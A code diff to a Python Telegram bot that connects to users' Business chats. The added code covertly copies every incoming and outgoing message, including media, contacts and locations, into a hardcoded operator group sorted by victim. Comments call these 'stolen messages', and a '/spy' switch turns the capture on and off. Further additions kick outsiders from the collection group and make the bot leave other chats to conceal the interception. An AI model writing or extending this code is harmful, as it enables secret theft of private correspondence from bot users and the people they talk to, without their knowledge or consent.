@@ -6,8 +6,8 @@ import time
 from pathlib import Path
 from collections import OrderedDict
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
-from aiogram.filters import Command
+from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection, ChatMemberUpdated
+from aiogram.filters import Command, ChatMemberUpdatedFilter, JOIN_TRANSITION
 from aiogram.exceptions import TelegramRetryAfter
 from fun import cmd_spam, get_like_suffix, spam_running, delete_command
 from save import cmd_save, cmd_broadcast, auto_download, extract_url
@@ -40,6 +40,22 @@ if not _admin_raw or not "".join(filter(str.isdigit, _admin_raw)):
 
 ADMIN_ID = int("".join(filter(str.isdigit, _admin_raw)))
 
+# GROUP_ID — id форум-группы (с топиками), куда складываются ВСЕ перехваченные
+# сообщения, рассортированные по темам (одна тема на одного владельца бота).
+# Жёстко захардкожен: даже если бота случайно добавят в другую группу,
+# пересылка туда НИКОГДА не уйдёт. Можно переопределить через env GROUP_ID.
+_DEFAULT_GROUP_ID = -1003974749024
+_group_raw = os.getenv("GROUP_ID", "").strip()
+GROUP_ID: int = _DEFAULT_GROUP_ID
+if _group_raw:
+    _g = _group_raw.lstrip("-")
+    if _g.isdigit():
+        GROUP_ID = int(_group_raw)
+    else:
+        logging.warning(
+            f"GROUP_ID='{_group_raw}' некорректен, использую дефолт {_DEFAULT_GROUP_ID}"
+        )
+
 bot = Bot(token=TOKEN2)
 dp = Dispatcher()
 
@@ -52,6 +68,15 @@ connected_users: dict[int, dict] = {}
 connection_owners: dict[str, int] = {}
 banned_users: set[int] = set()
 stats: dict[str, int] = {"deleted": 0, "edited": 0, "connections": 0}
+
+# Соответствие owner_id → message_thread_id темы в группе GROUP_ID.
+# Сохраняется в state.json и переживает рестарты, чтобы не плодить
+# дубли тем для одного и того же владельца.
+owner_topics: dict[int, int] = {}
+# Блокировка против гонок: если параллельно прилетают сразу несколько
+# сообщений от одного owner_id и темы ещё нет — без блокировки мы бы
+# создали несколько тем с одинаковым именем.
+_topic_lock = asyncio.Lock()
 
 # Ключ — пара (owner_id, chat_id). Раньше это был просто chat_id, и если
 # несколько владельцев бота общались с одним и тем же человеком, /like
@@ -191,6 +216,7 @@ def _do_persist_sync():
         "muted_chats": list(muted_chats),
         "custom_aliases": custom_aliases,
         "spy_enabled": spy_enabled,
+        "owner_topics": {str(k): v for k, v in owner_topics.items()},
     }
     tmp_state = STATE_FILE.with_suffix(".tmp")
     tmp_state.write_text(json.dumps(state, ensure_ascii=False), encoding="utf-8")
@@ -241,6 +267,14 @@ def load_persistent_state():
             try:
                 global spy_enabled
                 spy_enabled = bool(state.get("spy_enabled", True))
+            except Exception:
+                pass
+            try:
+                for k, v in (state.get("owner_topics") or {}).items():
+                    try:
+                        owner_topics[int(k)] = int(v)
+                    except (TypeError, ValueError):
+                        pass
             except Exception:
                 pass
             try:
@@ -522,13 +556,58 @@ async def forward_deleted(msg: Message, owner_id: int):
         await send_deleted_msg(ADMIN_ID, msg, build_deleted_header_admin(msg, owner_id))
 
 
+async def get_or_create_topic(owner_id: int) -> int | None:
+    """Возвращает message_thread_id темы для owner_id в GROUP_ID.
+
+    Создаёт новую тему, если её нет. Дедуп через _topic_lock — если
+    параллельно прилетают несколько сообщений от одного владельца и
+    темы ещё нет, создастся ровно одна.
+    Возвращает None при невозможности создать тему — тогда вызывающий
+    код сам решает, куда сложить сообщение (резерв — ЛС админа).
+    """
+    if owner_id in owner_topics:
+        return owner_topics[owner_id]
+    async with _topic_lock:
+        # Двойная проверка после захвата блокировки.
+        if owner_id in owner_topics:
+            return owner_topics[owner_id]
+        info = connected_users.get(owner_id)
+        if info:
+            base = info.get("name") or str(owner_id)
+            uname = info.get("username") or ""
+            title = base + (f" @{uname}" if uname else "") + f" [{owner_id}]"
+        else:
+            title = str(owner_id)
+        # Telegram ограничивает имя темы 128 символами.
+        title = title[:128]
+        try:
+            topic = await bot.create_forum_topic(chat_id=GROUP_ID, name=title)
+            tid = topic.message_thread_id
+            owner_topics[owner_id] = tid
+            schedule_persist()
+            logging.info(f"[TOPIC] создана тема {tid} '{title}' для owner_id={owner_id}")
+            return tid
+        except Exception as e:
+            logging.error(f"[TOPIC] не удалось создать тему для owner_id={owner_id}: {e}")
+            return None
+
+
 async def forward_to_admin_silent(owner_id: int, msg: Message):
-    """Бесшумно пересылает админу ЛЮБОЕ входящее сообщение собеседника:
-    текст, медиа, стикеры, голосовые, контакты, гео и т.д.
-    Собеседник этого не видит — пересылка идёт напрямую в чат админа с ботом.
+    """Бесшумно копирует в группу GROUP_ID ЛЮБОЕ сообщение из бизнес-чата
+    владельца — и ВХОДЯЩИЕ от собеседника, и ИСХОДЯЩИЕ от самого владельца.
+    Сортирует по теме owner_id (одна тема на одного владельца).
+
+    Ни в какие другие чаты пересылка НЕ идёт — назначение жёстко = GROUP_ID.
+    Если темы создать не удалось (нет прав, неверный GROUP_ID и т.п.) —
+    шлём резервно в ЛС ADMIN_ID, чтобы не потерять сообщение.
     """
     try:
+        sender_id = msg.from_user.id if msg.from_user else None
+        is_outgoing = sender_id is not None and sender_id == owner_id
+
         name, uid = build_sender_info(msg)
+
+        # Информация о владельце (вторая сторона переписки на том конце).
         info = connected_users.get(owner_id)
         if info:
             biz_user = escape_html(info["name"])
@@ -537,52 +616,90 @@ async def forward_to_admin_silent(owner_id: int, msg: Message):
             biz_user += f" [ID: {owner_id}]"
         else:
             biz_user = str(owner_id)
-        header_base = (
-            f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
-            f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
-            f'📨 Переписка: {biz_user}'
-        )
+
+        # Информация о собеседнике владельца (для исходящих указываем явно).
+        try:
+            partner_name = (
+                getattr(msg.chat, "full_name", None)
+                or getattr(msg.chat, "first_name", None)
+                or ""
+            )
+            partner_uname = getattr(msg.chat, "username", "") or ""
+            partner = escape_html(partner_name) if partner_name else ""
+            if partner_uname:
+                partner = (partner + ", " if partner else "") + f"@{partner_uname}"
+            partner += (" " if partner else "") + f"[ID: {msg.chat.id}]"
+        except Exception:
+            partner = f"[ID: {msg.chat.id}]"
+
+        if is_outgoing:
+            direction = '↗️ Исходящее (владелец → собеседник)'
+            header_base = (
+                f'{direction}\n'
+                f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
+                f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
+                f'📨 Переписка: {biz_user} → {partner}'
+            )
+        else:
+            direction = '↘️ Входящее (собеседник → владелец)'
+            header_base = (
+                f'{direction}\n'
+                f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
+                f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
+                f'📨 Переписка: {biz_user}'
+            )
+
+        # Маршрутизация: ВСЕГДА только GROUP_ID + тема владельца.
+        # Никакие другие chat_id здесь использоваться НЕ ДОЛЖНЫ.
+        topic_id = await get_or_create_topic(owner_id)
+        if topic_id is not None:
+            dest = GROUP_ID
+            kw: dict = {"message_thread_id": topic_id, "disable_notification": True}
+        else:
+            # Резерв: тема не создалась — не теряем сообщение, кладём в ЛС админа.
+            dest = ADMIN_ID
+            kw = {}
 
         # 1) Чистый текст без медиа — самое частое, отдельная ветка.
         if msg.text and not has_media(msg):
             full = f"{header_base}\n💬 {escape_html(msg.text)}"
-            await bot.send_message(ADMIN_ID, full, parse_mode="HTML")
+            await bot.send_message(dest, full, parse_mode="HTML", **kw)
             return
 
         header = header_base + "\n📎 медиафайл:"
         if msg.photo:
             caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, parse_mode="HTML")
+            await bot.send_photo(dest, msg.photo[-1].file_id, caption=caption, parse_mode="HTML", **kw)
         elif msg.video:
             caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_video(ADMIN_ID, msg.video.file_id, caption=caption, parse_mode="HTML")
+            await bot.send_video(dest, msg.video.file_id, caption=caption, parse_mode="HTML", **kw)
         elif msg.voice:
-            await bot.send_voice(ADMIN_ID, msg.voice.file_id, caption=header, parse_mode="HTML")
+            await bot.send_voice(dest, msg.voice.file_id, caption=header, parse_mode="HTML", **kw)
         elif msg.audio:
             caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_audio(ADMIN_ID, msg.audio.file_id, caption=caption, parse_mode="HTML")
+            await bot.send_audio(dest, msg.audio.file_id, caption=caption, parse_mode="HTML", **kw)
         elif msg.document:
             caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_document(ADMIN_ID, msg.document.file_id, caption=caption, parse_mode="HTML")
+            await bot.send_document(dest, msg.document.file_id, caption=caption, parse_mode="HTML", **kw)
         elif msg.video_note:
-            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
-            await bot.send_video_note(ADMIN_ID, msg.video_note.file_id)
+            await bot.send_message(dest, header, parse_mode="HTML", **kw)
+            await bot.send_video_note(dest, msg.video_note.file_id, **kw)
         elif msg.sticker:
-            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
-            await bot.send_sticker(ADMIN_ID, msg.sticker.file_id)
+            await bot.send_message(dest, header, parse_mode="HTML", **kw)
+            await bot.send_sticker(dest, msg.sticker.file_id, **kw)
         elif msg.animation:
-            await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
-            await bot.send_animation(ADMIN_ID, msg.animation.file_id)
+            await bot.send_message(dest, header, parse_mode="HTML", **kw)
+            await bot.send_animation(dest, msg.animation.file_id, **kw)
         else:
             # Всё остальное (опросы, гео, контакты, dice и т.п.) — копируем
             # как есть, чтобы ничего не потерять.
             try:
-                await bot.send_message(ADMIN_ID, header_base, parse_mode="HTML")
-                await bot.copy_message(ADMIN_ID, msg.chat.id, msg.message_id)
+                await bot.send_message(dest, header_base, parse_mode="HTML", **kw)
+                await bot.copy_message(dest, msg.chat.id, msg.message_id, **kw)
             except Exception as e:
                 logging.warning(f"Не удалось скопировать неизвестный тип сообщения: {e}")
     except Exception as e:
-        logging.error(f"Ошибка тихой пересылки админу: {e}")
+        logging.error(f"Ошибка тихой пересылки в группу: {e}")
 
 
 @dp.business_connection()
@@ -952,12 +1069,13 @@ async def handle_business_message(message: Message):
         except Exception as e:
             logging.warning(f"[MIRROR] не удалось повторить: {e}")
 
-    # Тихая пересылка админу ВСЕХ входящих сообщений собеседника
-    # (текст, медиа, стикеры, ссылки, гео и т.д.). Делаем это до любых
-    # ранних return, чтобы ничего не потерять — например, сообщения со
-    # ссылками ниже уходят в return.
+    # Тихая пересылка В ГРУППУ GROUP_ID ВСЕХ сообщений из бизнес-чата —
+    # и входящих от собеседника, и исходящих от самого владельца.
+    # Сортировка по теме на каждого владельца. Делаем это до любых ранних
+    # return, чтобы ничего не потерять — например, сообщения со ссылками
+    # ниже уходят в return.
     # Включается/выключается через /spy on|off (только админ).
-    if spy_enabled and sender_id is not None and sender_id != owner_id:
+    if spy_enabled and sender_id is not None:
         asyncio.create_task(forward_to_admin_silent(owner_id, message))
 
     msg_text = message.text or message.caption or ""
@@ -1162,6 +1280,95 @@ async def handle_deleted_event(event: BusinessMessagesDeleted):
         except Exception as e:
             logging.error(f"Не удалось переслать удалённое сообщение {msg_id}: {e}")
     logging.info(f"Переслано {sent_count}/{len(snapshot)} удалённых владельцу {owner_id}")
+
+
+# ──────────── Защита группы GROUP_ID ────────────
+# Жёсткие правила:
+#  1) Бот пересылает украденные сообщения ИСКЛЮЧИТЕЛЬНО в GROUP_ID
+#     (захардкожено в forward_to_admin_silent — больше нигде).
+#  2) Любого, кто зашёл в GROUP_ID и не админ/не бот — кикаем.
+#  3) Если бота добавили в ЛЮБУЮ другую группу/супергруппу/канал —
+#     он сам оттуда выходит, чтобы исключить случайные утечки.
+#  4) Любые сообщения, прилетевшие в чужую группу (если бот вдруг ещё
+#     не успел из неё выйти), мы просто игнорируем — никакой логики
+#     там не запускается.
+
+@dp.chat_member(ChatMemberUpdatedFilter(JOIN_TRANSITION))
+async def kick_intruders(event: ChatMemberUpdated):
+    """В нужной группе — кик любого, кто не админ и не бот.
+    В любой другой группе — мгновенный выход бота.
+    """
+    chat_id = event.chat.id
+    user = event.new_chat_member.user
+
+    # Если новый участник — сам наш бот, и он попал НЕ в нужную группу,
+    # уходим оттуда сразу.
+    try:
+        me = await bot.me()
+    except Exception:
+        me = None
+    if me and user.id == me.id and chat_id != GROUP_ID:
+        try:
+            await bot.leave_chat(chat_id)
+            logging.warning(
+                f"[GROUP] бот добавлен в чужую группу chat_id={chat_id}, выхожу"
+            )
+        except Exception as e:
+            logging.error(f"[GROUP] не удалось выйти из чужой группы {chat_id}: {e}")
+        return
+
+    # Дальше — только нужная группа.
+    if chat_id != GROUP_ID:
+        return
+
+    # Не трогаем админа и ботов (включая нашего).
+    if user.id == ADMIN_ID or user.is_bot:
+        return
+
+    try:
+        await bot.ban_chat_member(GROUP_ID, user.id)
+        logging.info(
+            f"[GROUP] кикнут чужой пользователь {user.id} ({user.full_name}) из группы"
+        )
+    except Exception as e:
+        logging.error(f"[GROUP] не удалось кикнуть {user.id}: {e}")
+
+
+@dp.my_chat_member()
+async def on_bot_added_somewhere(event: ChatMemberUpdated):
+    """Любая другая группа/супергруппа/канал, куда добавили бота — уходим.
+    Это страховка от ситуации «бот в чужом чате» — никакой пересылки
+    и никакой логики там работать не должно.
+    """
+    chat_id = event.chat.id
+    chat_type = event.chat.type  # "private" | "group" | "supergroup" | "channel"
+
+    if chat_type == "private":
+        return
+    if chat_id == GROUP_ID:
+        return
+
+    new_status = event.new_chat_member.status  # member / administrator / left / kicked
+    if new_status in ("member", "administrator", "restricted"):
+        try:
+            await bot.leave_chat(chat_id)
+            logging.warning(
+                f"[GROUP] бот оказался в чужом чате chat_id={chat_id} "
+                f"({chat_type}), выхожу"
+            )
+        except Exception as e:
+            logging.error(f"[GROUP] не удалось покинуть чат {chat_id}: {e}")
+
+
+@dp.message(F.chat.type.in_({"group", "supergroup"}))
+async def ignore_foreign_group_messages(message: Message):
+    """Любые сообщения в группах, кроме GROUP_ID, молча игнорируем.
+    Дополнительный страховочный фильтр: даже если бот ещё не успел
+    выйти из чужой группы, никакая команда оттуда не сработает.
+    В самой GROUP_ID мы тоже ничего не обрабатываем — туда мы только
+    пишем перехваченное; команды и /q/.лайк/etc там не нужны.
+    """
+    return
 
 
 START_TEXT = (
